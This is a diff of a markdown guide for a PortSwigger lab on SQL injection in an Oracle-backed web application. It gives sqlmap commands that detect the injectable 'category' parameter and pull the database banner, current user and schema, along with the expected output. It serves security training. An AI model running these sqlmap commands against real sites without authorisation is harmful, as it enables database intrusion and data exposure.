@@ -2,9 +2,18 @@
 
 ## Objective
 
-Verify the SQL Injection vulnerability using SQLMap and retrieve the Oracle database version.
+Verify the SQL Injection vulnerability using SQLMap and identify the backend database type and version.
 
-> **Note:** SQLMap is used only to verify the vulnerability and confirm the database version. The lab is solved manually in `README.md`.
+> **Note:** This lab is solved manually in `README.md`. SQLMap is used only to verify the vulnerability and confirm the Oracle database version.
+
+---
+
+# Lab Information
+
+- **Lab:** SQL Injection Attack, Querying the Database Type and Version on Oracle
+- **Target Parameter:** `category`
+- **HTTP Method:** GET
+- **Backend Database:** Oracle
 
 ---
 
@@ -20,19 +29,31 @@ Replace the URL with your own PortSwigger lab URL.
 
 # Step 1 - Detect SQL Injection
 
+Run SQLMap against the vulnerable parameter.
+
 ```bash
 sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --batch
 ```
 
 ## Purpose
 
-- Tests whether the `category` parameter is injectable.
-- Detects the SQL Injection automatically.
-- Identifies the backend database.
+- Detect SQL Injection automatically.
+- Identify the vulnerable parameter.
+- Detect the backend DBMS.
+
+### Expected Output
+
+```text
+Parameter: category (GET)
+Type: UNION query
+Backend DBMS: Oracle
+```
 
 ---
 
 # Step 2 - Retrieve the Database Banner
+
+Retrieve the Oracle database version.
 
 ```bash
 sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --banner --batch
@@ -40,25 +61,28 @@ sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessor
 
 ## Purpose
 
-- Retrieves the Oracle database banner.
-- Displays the database version.
-- Confirms the backend DBMS.
+- Retrieve the Oracle database banner.
+- Display the database version.
+- Confirm the backend database.
 
-Example Output
+### Expected Output
 
 ```text
-banner: Oracle Database 19c Enterprise Edition Release ...
+banner:
+Oracle Database 19c Enterprise Edition Release ...
 ```
 
 ---
 
-# Step 3 - View Current User (Optional)
+# Step 3 - Retrieve Current User (Optional)
+
+Retrieve the current database user.
 
 ```bash
 sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --current-user --batch
 ```
 
-Example Output
+### Expected Output
 
 ```text
 current user: APPUSER
@@ -66,34 +90,62 @@ current user: APPUSER
 
 ---
 
-# Step 4 - View Current Database (Optional)
+# Step 4 - Retrieve Current Database / Schema (Optional)
+
+Retrieve the current database schema.
 
 ```bash
 sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --current-db --batch
 ```
 
+### Expected Output
+
+```text
+current schema: APPUSER
+```
+
+> For Oracle, SQLMap may display the current schema instead of a database name because Oracle organizes objects using schemas.
+
 ---
 
-# Expected SQLMap Output
+# Expected SQLMap Results
 
-- SQL Injection confirmed.
-- Backend DBMS identified as Oracle.
-- Oracle database version displayed.
-- Current user (optional).
-- Current database/schema (optional).
+After running the above commands, SQLMap should:
+
+- Detect the SQL Injection vulnerability.
+- Identify Oracle as the backend DBMS.
+- Display the Oracle database version.
+- Retrieve the current database user (optional).
+- Retrieve the current schema (optional).
+
+---
+
+# Commands Used
+
+| Command | Purpose |
+|---------|---------|
+| `sqlmap -u URL --batch` | Detect SQL Injection |
+| `sqlmap -u URL --banner --batch` | Retrieve database version |
+| `sqlmap -u URL --current-user --batch` | Retrieve current user |
+| `sqlmap -u URL --current-db --batch` | Retrieve current schema |
 
 ---
 
 # Notes
 
-- This lab is primarily intended to be solved manually.
+- This lab is intended to be solved manually.
 - SQLMap is used only to verify the vulnerability and retrieve database information.
-- Avoid using database dumping options (`--dump`, `--tables`, `--columns`) unless the lab specifically requires enumeration.
+- Avoid using enumeration commands such as:
+  - `--dbs`
+  - `--tables`
+  - `--columns`
+  - `--dump`
+- Those commands are unnecessary for this lab because the objective is only to identify the database type and version.
 
 ---
 
 # Related Files
 
 - `README.md` – Manual solution
-- `../../Database-Queries/Oracle.md` – Oracle SQL Injection reference
+- `../../Database-Queries/Oracle.md` – Oracle SQL Injection guide
 - `../../SQLMap-CheatSheet.md` – SQLMap command reference
